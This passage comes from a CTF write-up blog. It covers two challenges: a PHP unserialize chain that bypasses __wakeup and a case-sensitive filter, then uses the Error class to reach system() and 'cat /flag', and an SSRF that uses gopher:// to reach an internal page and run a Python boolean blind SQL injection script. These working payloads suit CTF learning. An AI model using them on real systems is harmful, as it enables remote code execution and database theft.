class="hljs-variable">$pip</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">pipimi</span>();<br><span class="hljs-variable">$pip</span>-&gt;a=<span class="hljs-variable">$pop</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pip</span>);<br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230406153731384.png"></p><p>漏洞存在，注意到popko类中的__wakeup()方法若执行会将left和right的值清空，_call()方法体的条件无法满足因此要绕过__wakeup()方法，</p><p>将生成的exp进行修改：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br><span class="hljs-comment">//将popko的对象数2改为比2大的数</span><br>O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>注意到函数主体部分有判断语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>], <span class="hljs-string">&quot;popko&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;c&quot;</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>strrstr()函数区分大小写，但是php类不区分大小写，进行大写绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;<br></code></pre></td></tr></table></figure><p>GET传入c</p><p><img src="/2023/02/10/ROIS/image-20230406170242128.png"></p><p>进入后门后查看backdoor()函数体：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">backdoor</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br>    <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>    <span class="hljs-variable">$d</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;d&quot;</span>];<br>    <span class="hljs-variable">$e</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;e&quot;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;f&quot;</span>];<br>    <span class="hljs-variable">$g</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;g&quot;</span>];<br>    <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$b</span>);<br>    <span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$d</span>, <span class="hljs-variable">$e</span>);<br>    <span class="hljs-variable">$str2</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$class</span>, <span class="hljs-variable">$f</span>, <span class="hljs-variable">$g</span>);<br>    <span class="hljs-variable">$str1</span>(<span class="hljs-variable">$str2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>$a是一个类，向类$a中传入参数$b返回值赋值给$class。但是并未定义这样一个满足条件的类，这时候就要去学习php原生类的知识了。查找到原生类ERROR。</p><p><img src="/2023/02/10/ROIS/image-20230406171445334.png"></p><p>可以看到返回值前面几个字符为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Error</span>: <span class="hljs-number">12345</span><span class="hljs-comment">#注意引号和字符串&quot;12345&quot;之间有个空格</span><br></code></pre></td></tr></table></figure><p>目的就很明确了，$a为ERROR原生类，$b为一个由命令执行函数和执行的命令组成的字符串。$d和$e代表命令执行函数在ERROR返回值中的首位置和命令执行函数的长度，$f和$g代表所执行的命令在ERROR返回值中的首位置和长度进行截取。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;ERROR&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;systemls&quot;</span><br><span class="hljs-comment">#此时error返回Error: systemls，其中s位于第七个位置，&quot;system&quot;长度6，同理，l位于13，&quot;ls&quot;长度2，则</span><br><span class="hljs-variable">$d</span> = <span class="hljs-number">7</span>;<br><span class="hljs-variable">$e</span> = <span class="hljs-number">6</span>;<br><span class="hljs-variable">$f</span> = <span class="hljs-number">13</span>;<br><span class="hljs-variable">$g</span> = <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>GET传入a、b、d、e、f、g对应的值。</p><p><img src="/2023/02/10/ROIS/image-20230406172912264.png"></p><p>命令执行成功了。</p><p>对b、d、e、f、g进行修改，发现根目录下存在flag。</p><p><img src="/2023/02/10/ROIS/image-20230406173119381.png"></p><p>最终payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;pipimi&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Popko&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;left&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">1</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;right&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;i:<span class="hljs-number">2</span>;&#125;&#125;&#125;&amp;a=<span class="hljs-built_in">Error</span>&amp;b=systemcat /flag&amp;d=<span class="hljs-number">7</span>&amp;e=<span class="hljs-number">6</span>&amp;f=<span class="hljs-number">13</span>&amp;g=<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/10/ROIS/image-20230406173259433.png"></p>]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2023/02/09/SSRF/"/>
    <url>/2023/02/09/SSRF/</url>
    
    <content type="html"><![CDATA[<h2 id="2023ROIS冬令营internal"><a href="#2023ROIS冬令营internal" class="headerlink" title="2023ROIS冬令营internal"></a>2023ROIS冬令营internal</h2><p>这是什么，两个超链接，点一下（</p><p><img src="/2023/02/09/SSRF/image-20230410150245999.png"></p><p>​SQLI页面中的内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try to access it from internal!&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome!\n&quot;</span>;<br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$con</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(DB_HOST, DB_USER, DB_PASS, DB_DATABASE);<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM messages WHERE id=<span class="hljs-subst">$id</span>&quot;</span>; <span class="hljs-comment">// SQLI &gt;_&lt;</span><br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$res</span>)[<span class="hljs-string">&#x27;message&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$message</span>;<br><span class="hljs-comment">#回显Try to access it from internal!</span><br></code></pre></td></tr></table></figure><p><code>if ($_SERVER[&#39;REMOTE_ADDR&#39;] !== &#39;127.0.0.1&#39;)</code>用户访问的IP必须是本地IP才能进行下面的数据库操作等步骤，也就是说只有通过网页服务器内网访问。如果我们能够通过这个服务器中的另外一个不限制于内网访问的页面，把它当做跳板间接对这个仅内网访问的页面进行操作，就能进行传参等操作。也就是实现SSRF。先看另外一个页面：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Hint: Do you know gopher?</span><br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/file:|ftp:|http:|scp:|dict:/i&quot;</span>,<span class="hljs-variable">$url</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br><span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$res</span>;<br></code></pre></td></tr></table></figure><p><code>curl_init()</code>函数初始化一个curl绘会话，值传给<code>$ch</code>，<code>curl_exec()</code>函数执行一个curl会话，值传给<code>$res</code>。最后将结果打印出来。既然可以执行curl，那么不就意味着可以通过这个页面对SQLI页面进行传参等操作了吗。给出了提示：<code>&quot;Do you know gopher?&quot;</code>。emmm。。。并不知道。那就学呗。找到了一篇<a href="https://zhuanlan.zhihu.com/p/112055947">讲的比较详细的文章</a>学习了一下。</p><p>gopher是啥？它是一种协议，支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。</p><p>gopher协议的格式：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">gopher:</span>//&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/_</span>后接<span class="hljs-title class_">TCP</span>数据流<br></code></pre></td></tr></table></figure><p>需要注意的是，TCP数据流必须是经过url编码的，并且回车和换行必须是<code>%0D%0A</code>，使用脚本或工具编码后回车换行会变成<code>%0A</code>，因此要多一步replace的步骤。在HTTP包的最后要加<code>%0D%0A</code>，代表消息结束（具体可研究HTTP包结束）。以下是通过gopher协议传参的一次示例：</p><p>GET请求：</p><p>准备好一个监听机和一个用户机：</p><p><img src="/2023/02/09/SSRF/image-20230410153558433.png"></p><p><code>nc -lp 1234</code>监听1234端口，使用curl发送http请求<code>curl gopher://172.17.0.1:1234/abcd</code>，监听机收到消息为”bcd”；发送请求<code>curl gopher://172.17.0.1:1234/aabcd</code>nc监听到abcd。因此紧跟在<code>&quot;&lt;PORT&gt;/&quot;</code>字符后面的一个字符会被忽略，可换为任意一个字符。</p><p><img src="/2023/02/09/SSRF/image-20230410182351129.png"></p><p>这是一段网页源码，作用是将GET传入的name的值打印出来：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个GET请求包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/ssrf.php?name=Potatowo</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.17.0.1<br>#回车<br></code></pre></td></tr></table></figure><p>经Python脚本编写，生成对应的请求包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;GET /ssrf.php?name=Margin HTTP/1.1</span><br><span class="hljs-string">Host: 172.17.0.1</span><br><span class="hljs-string">#该行要有回车，HTTP数据包结尾</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<span class="hljs-comment">#此处将&quot;%0A&quot;替换成&quot;%0D%0A&quot;</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A</span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_GET%20/ssrf.php%3Fname%3DMargin%20HTTP/1.1%0D%0AHost%3A%20172.17.0.1%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>POST请求：</p><p>这是一段网页源码，功能不做过多赘述：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello &quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#保存为ssrf.php</span><br></code></pre></td></tr></table></figure><p>这是一个POST请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ssrf/base/post.php</span> <span class="hljs-meta">HTTP/1.1</span><br>host:172.17.0.1<br>Content-Type:application/x-www-form-urlencoded<br>Content-Length:11<br><br><span class="language-ini"><span class="hljs-attr">name</span>=Potatowo</span><br><span class="language-ini"><span class="hljs-comment">#回车</span></span><br></code></pre></td></tr></table></figure><p>改为构成符合gopher协议的请求后通过curl发出请求：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl gopher://172.17.0.1:8080/_POST%20/ssrf/base/post.php%20HTTP/1.1%0D%0Ahost%3A172.17.0.1%0D%0AContent-Type%3Aapplication/x-www-form-urlencoded%0D%0AContent-Length%3A11%0D%0Aname%3DPotatowo%0D%0A%0D%0A<br><span class="hljs-comment">#注意&quot;8080/&quot;后面紧跟着一个&quot;_&quot;字符。</span><br></code></pre></td></tr></table></figure><p>现在回到本题；</p><p>既然用得到请求包，那就先bp抓包，对SQLI页面传参，那就抓SQLI页面的包：</p><p><img src="/2023/02/09/SSRF/image-20230410194114453.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>data = \<br><span class="hljs-string">&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1#使用脚本时删掉该注释，此处要把原包ip改为改为127.0.0.1</span><br><span class="hljs-string">Content-Length: 4</span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string">id=1</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>result = urllib.parse.quote(data)<br>result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = result = urllib.parse.quote(result)<br><span class="hljs-comment">#要注意！！如果是希望在浏览器里传参，则要编码两次！！浏览器会自动解码一次，后端解码一次；但是像下面</span><br><span class="hljs-comment">#要讲的用python的requests库直接传参就只需要编码一次因为不需要经过浏览器解码</span><br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#POST%2520/sqli.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Length%253A%25204%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/109.0.0.0%2520Safari/537.36%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250AConnection%253A%2520close%250D%250A%250D%250Aid%253D1%250D%250A%250D%250A</span><br><br></code></pre></td></tr></table></figure><p>改为符合gopher协议的形式，注意由于<code>curl_exec()</code>的执行是在服务端里进行的，所以<code>gopher://</code>协议的地址应改为<code>127.0.0.1:80</code>，80端口是跑web服务的端口。</p><p><img src="/2023/02/09/SSRF/image-20230410201414804.png"></p><p>将脚本中的content进行修改，<code>content = &quot;id=1 and 1=1&quot;</code>，传入，结果：</p><p><img src="/2023/02/09/SSRF/image-20230411013245234.png"></p><p>emmm。。这时候突然想起来SQLI页面是不是有过滤来着赶紧打开看了眼</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/union| /i&quot;</span>,<span class="hljs-variable">$id</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;You bad bad &gt;_&lt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>看来是ban掉了union和空格。难怪，那改成<code>content = &quot;id=1/**/and/**/1=1&quot;</code>绕过空格过滤，回显<code>&quot;Welcome! meow meow meow~1&quot;</code>，改成<code>content = &quot;id=1/**/and/**/1=2&quot;</code>，回显<code>&quot;Welcome! 1&quot;</code>。sql语句判断为真会返回<code>&quot;Welcome! meow meow meow~1&quot;</code>，为假不含<code>meow meow meow~</code>，同时union被ban了，尝试用加号拼接<code>&quot;uni&quot;</code>,<code>&quot;on&quot;</code>，结果加号url编码与空格相同（悲，现在意图也比较明显了，布尔盲注。</p><p>完善脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://192.168.150.1:43083/curl.php&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">126</span>):<br>    content = <span class="hljs-string">&quot;id=1 and (length(database())=&#123;&#125;)#&quot;</span>.<span class="hljs-built_in">format</span>(i)<br>    content = content.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;/**/&quot;</span>)<span class="hljs-comment">#SQL页面存在空格过滤用/**/绕过</span><br>    content_length = <span class="hljs-built_in">len</span>(content)<br>    data = \<span class="hljs-comment">#切记切记下面字符串每行左边要贴边，不然tab会被编码</span><br><span class="hljs-string">f&quot;&quot;&quot;POST /sqli.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Length: <span class="hljs-subst">&#123;content_length&#125;</span></span><br><span class="hljs-string">Cache-Control: max-age=0</span><br><span class="hljs-string">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36</span><br><span class="hljs-string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="hljs-string">Accept-Encoding: gzip, deflate</span><br><span class="hljs-string">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string"></span><br><span class="hljs-string"><span class="hljs-subst">&#123;content&#125;</span></span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    result = urllib.parse.quote(data)<br>    result = result.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>    payload = <span class="hljs-string">&quot;gopher://127.0.0.1:80/_&quot;</span>+result<span class="hljs-comment">#用python直接传参只需要编码一次</span><br>    r = requests.post(url,data=&#123;<span class="hljs-string">&quot;url&quot;</span>:payload&#125;).text<br>    <span class="hljs-comment">#print(r)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;meow&quot;</span> <span class="hljs-keyword">in</span> r:<span class="hljs-comment">#如果sql返回为真，页面会显示&quot;meow meow~&quot;</span><br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment">#output</span><br><span class="hljs-comment">#3</span><br></code></pre></td></tr></table></figure><p>输出3，得出数据库长度为3。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 